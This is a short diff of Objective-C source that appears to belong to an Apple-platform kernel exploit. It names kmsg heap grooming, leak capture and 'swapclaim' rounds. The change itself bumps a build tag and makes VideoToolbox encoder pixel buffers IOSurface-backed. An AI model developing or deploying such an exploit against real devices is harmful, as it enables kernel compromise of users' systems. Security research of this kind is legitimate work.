@@ -107,7 +107,7 @@ static void p110_flushCB(void *r, void *e, OSStatus st, VTEncodeInfoFlags f, CMS
 #import <IOKit/IOKitLib.h>       /* dlsym'd calls still; only the UC types  */
 #import <sys/qos.h>
 
-#define P110_BUILD      @"p110-swapclaim-v4.0-cleanprops"
+#define P110_BUILD      @"p110-swapclaim-v4.1-iosurfpb"
 #define P110_GROOM_KDATA 0x1000        /* the groom kmsg's kdata size       */
 #define P110_ROUNDS     64
 #define P110_PREFILL_MAX  8     /* bandit arm room: prefill 6 (default) vs 8 */
@@ -717,9 +717,14 @@ static BOOL p110_leak_capture(NSString *tag, BOOL print, P110LeakSnap *snap) {
                 int wcb = 0;
                 if (wprep == noErr) {
                     CVPixelBufferRef wpb = NULL;
+                    /* v4.1: the VT hardware encoder requires IOSURFACE-BACKED
+                       pixel buffers (v3.9/4.0 passed NULL attrs -> plain
+                       memory -> async failure -17691, zero samples). */
+                    NSDictionary *wpbAttrs = @{
+                        (id)kCVPixelBufferIOSurfacePropertiesKey: @{} };
                     if (CVPixelBufferCreate(kCFAllocatorDefault, 1280, 720,
                             kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
-                            NULL, &wpb) == noErr && wpb) {
+                            (__bridge CFDictionaryRef)wpbAttrs, &wpb) == noErr && wpb) {
                         VTEncodeInfoFlags wflags = 0;
                         est = VTCompressionSessionEncodeFrame(ws, wpb,
                             CMTimeMake((int64_t)wc, 30), kCMTimeInvalid, NULL,
